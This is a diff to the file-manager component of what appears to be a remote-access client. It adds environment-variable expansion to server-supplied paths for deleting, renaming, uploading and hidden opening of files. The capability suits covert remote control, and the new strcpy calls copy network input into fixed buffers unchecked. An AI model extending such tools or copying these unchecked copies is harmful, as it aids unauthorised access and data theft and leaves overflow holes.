@@ -42,6 +42,17 @@ CFileManager::~CFileManager()
 }
 
 
+// 展开环境变量 (如 %USERPROFILE%, %DESKTOP% 等)
+static std::string ExpandPath(const char* path)
+{
+    char szExpanded[MAX_PATH];
+    DWORD len = ExpandEnvironmentStringsA(path, szExpanded, MAX_PATH);
+    if (len > 0 && len < MAX_PATH) {
+        return szExpanded;
+    }
+    return path;  // 展开失败则返回原路径
+}
+
 std::string GetExtractDir(const std::string& archivePath)
 {
     if (archivePath.size() >= 5) {
@@ -68,6 +79,10 @@ VOID CFileManager::OnReceive(PBYTE lpBuffer, ULONG nSize)
     switch (lpBuffer[0]) {
     case CMD_COMPRESS_FILES: {
         std::vector<std::string> paths = ParseMultiStringPath((char*)lpBuffer + 1, nSize - 1);
+        // 展开所有路径中的环境变量
+        for (size_t i = 0; i < paths.size(); i++) {
+            paths[i] = ExpandPath(paths[i].c_str());
+        }
         zsta::Error err = zsta::CZstdArchive::Compress(std::vector<std::string>(paths.begin() + 1, paths.end()), paths.at(0));
         if (err != zsta::Error::Success) {
             Mprintf("压缩失败: %s\n", zsta::CZstdArchive::GetErrorString(err));
@@ -81,7 +96,7 @@ VOID CFileManager::OnReceive(PBYTE lpBuffer, ULONG nSize)
         std::string dir;
         std::vector<std::string> paths = ParseMultiStringPath((char*)lpBuffer + 1, nSize - 1);
         for (size_t i = 0; i < paths.size(); i++) {
-            const std::string& path = paths[i];
+            std::string path = ExpandPath(paths[i].c_str());
             std::string destDir = GetExtractDir(path);
             zsta::Error err = zsta::CZstdArchive::Extract(path, destDir);
             if (err != zsta::Error::Success) {
@@ -98,35 +113,60 @@ VOID CFileManager::OnReceive(PBYTE lpBuffer, ULONG nSize)
     case COMMAND_LIST_FILES:// 获取文件列表
         SendFilesList((char *)lpBuffer + 1);
         break;
-    case COMMAND_DELETE_FILE:// 删除文件
-        DeleteFile((char *)lpBuffer + 1);
+    case COMMAND_DELETE_FILE: {// 删除文件
+        std::string path = ExpandPath((char *)lpBuffer + 1);
+        DeleteFile(path.c_str());
         SendToken(TOKEN_DELETE_FINISH);
         break;
-    case COMMAND_DELETE_DIRECTORY:// 删除文件
-        DeleteDirectory((char *)lpBuffer + 1);
+    }
+    case COMMAND_DELETE_DIRECTORY: {// 删除目录
+        std::string path = ExpandPath((char *)lpBuffer + 1);
+        DeleteDirectory(path.c_str());
         SendToken(TOKEN_DELETE_FINISH);
         break;
+    }
     case COMMAND_DOWN_FILES: // 上传文件
+        // 注意：不展开环境变量，保持原始路径发送给服务端
+        // 这样服务端的 Replace(m_Remote_Path, localPath) 能正确匹配
         UploadToRemote(lpBuffer + 1);
         break;
     case COMMAND_CONTINUE: // 上传文件
         SendFileData(lpBuffer + 1);
         break;
-    case COMMAND_CREATE_FOLDER:
-        CreateFolder(lpBuffer + 1);
+    case COMMAND_CREATE_FOLDER: {
+        std::string path = ExpandPath((char *)lpBuffer + 1);
+        CreateFolder((LPBYTE)path.c_str());
         break;
-    case COMMAND_RENAME_FILE:
-        Rename(lpBuffer + 1);
+    }
+    case COMMAND_RENAME_FILE: {
+        // 数据格式: [OldName\0][NewName\0]
+        char *pOldName = (char *)lpBuffer + 1;
+        char *pNewName = pOldName + strlen(pOldName) + 1;
+        std::string oldPath = ExpandPath(pOldName);
+        std::string newPath = ExpandPath(pNewName);
+        // 构造展开后的数据
+        char szBuf[MAX_PATH * 2 + 2];
+        strcpy(szBuf, oldPath.c_str());
+        strcpy(szBuf + oldPath.length() + 1, newPath.c_str());
+        Rename((LPBYTE)szBuf);
         break;
+    }
     case COMMAND_STOP:
         StopTransfer();
         break;
     case COMMAND_SET_TRANSFER_MODE:
         SetTransferMode(lpBuffer + 1);
         break;
-    case COMMAND_FILE_SIZE:
-        CreateLocalRecvFile(lpBuffer + 1);
+    case COMMAND_FILE_SIZE: {
+        // 数据格式: [8字节大小][文件名\0]
+        // 需要展开文件名部分
+        BYTE bNewBuffer[MAX_PATH + 16];
+        memcpy(bNewBuffer, lpBuffer + 1, 8);  // 复制大小
+        std::string path = ExpandPath((char *)lpBuffer + 9);
+        strcpy((char *)bNewBuffer + 8, path.c_str());
+        CreateLocalRecvFile(bNewBuffer);
         break;
+    }
     case COMMAND_FILE_DATA:
         WriteLocalRecvFile(lpBuffer + 1, nSize -1);
         break;
@@ -153,12 +193,16 @@ VOID CFileManager::OnReceive(PBYTE lpBuffer, ULONG nSize)
     case COMMAND_FILES_SEARCH_STOP:
         m_bSearching = false;
         break;
-    case COMMAND_OPEN_FILE_SHOW:
-        OpenFile((char *)lpBuffer + 1, SW_SHOW);
+    case COMMAND_OPEN_FILE_SHOW: {
+        std::string path = ExpandPath((char *)lpBuffer + 1);
+        OpenFile(path.c_str(), SW_SHOW);
         break;
-    case COMMAND_OPEN_FILE_HIDE:
-        OpenFile((char *)lpBuffer + 1, SW_HIDE);
+    }
+    case COMMAND_OPEN_FILE_HIDE: {
+        std::string path = ExpandPath((char *)lpBuffer + 1);
+        OpenFile(path.c_str(), SW_HIDE);
         break;
+    }
     default:
         break;
     }
@@ -661,16 +705,19 @@ UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
     DWORD	dwSizeLow;
     // 1 字节token, 8字节大小, 文件名称, '\0'
     HANDLE	hFile;
-    // 保存当前正在操作的文件名
+    // 保存当前正在操作的文件名（原始路径，可能含环境变量）
     memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
     strcpy(m_strCurrentProcessFileName, lpszFileName);
 
-    hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+    // 展开环境变量用于实际文件操作
+    std::string strExpanded = ExpandPath(lpszFileName);
+    hFile = CreateFile(strExpanded.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
     if (hFile == INVALID_HANDLE_VALUE)
         return FALSE;
     dwSizeLow =	GetFileSize(hFile, &dwSizeHigh);
     SAFE_CLOSE_HANDLE(hFile);
     // 构造数据包，发送文件长度
+    // 注意：发送原始路径（可能含环境变量），让服务端能正确 Replace
     int		nPacketSize = lstrlen(lpszFileName) + 10;
     BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
     if (bPacket==NULL) {
@@ -693,18 +740,18 @@ UINT CFileManager::SendFileData(LPBYTE lpBuffer)
 {
     UINT		nRet = 0;
     FILESIZE	*pFileSize;
-    char		*lpFileName;
 
     pFileSize = (FILESIZE *)lpBuffer;
-    lpFileName = m_strCurrentProcessFileName;
 
     // 远程跳过，传送下一个
     if (pFileSize->dwSizeLow == -1) {
         UploadNext();
         return 0;
     }
+    // 展开环境变量用于实际文件操作
+    std::string strExpanded = ExpandPath(m_strCurrentProcessFileName);
     HANDLE	hFile;
-    hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+    hFile = CreateFile(strExpanded.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
     if (hFile == INVALID_HANDLE_VALUE)
         return -1;
 
@@ -787,7 +834,9 @@ bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
     else
         lpszSlash = "";
 
-    wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);
+    // 展开环境变量用于 FindFirstFile
+    std::string strExpandedPath = ExpandPath(lpPathName);
+    wsprintf(lpszFilter, "%s%s*.*", strExpandedPath.c_str(), lpszSlash);
 
     HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
     if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
@@ -796,10 +845,12 @@ bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
     do {
         if (wfd.cFileName[0] != '.') {
             if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                // 保持原始路径（可能含环境变量）+ 子目录名
                 char strDirectory[MAX_PATH];
                 wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
                 FixedUploadList(strDirectory);
             } else {
+                // 保持原始路径（可能含环境变量）+ 文件名
                 char strFile[MAX_PATH];
                 wsprintf(strFile, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
                 m_UploadList.push_back(strFile);
@@ -868,7 +919,7 @@ void CFileManager::GetFileData()
 
     //  1字节Token,四字节偏移高四位，四字节偏移低四位
     BYTE	bToken[9];
-    DWORD	dwCreationDisposition = 0; // 文件打开方式
+    DWORD	dwCreationDisposition = CREATE_ALWAYS; // 文件打开方式
     memset(bToken, 0, sizeof(bToken));
     bToken[0] = TOKEN_DATA_CONTINUE;
 
